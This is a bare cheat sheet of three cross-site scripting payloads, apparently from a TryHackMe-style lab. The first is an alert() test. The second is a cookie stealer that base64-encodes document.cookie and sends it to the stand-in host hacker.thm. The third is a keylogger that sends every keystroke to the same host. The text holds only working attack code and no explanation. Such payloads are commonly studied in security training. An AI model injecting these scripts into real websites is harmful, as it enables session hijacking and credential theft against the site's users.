# test

<script>alert('XSS');</script>

# session steal

<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>

# key logger

<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
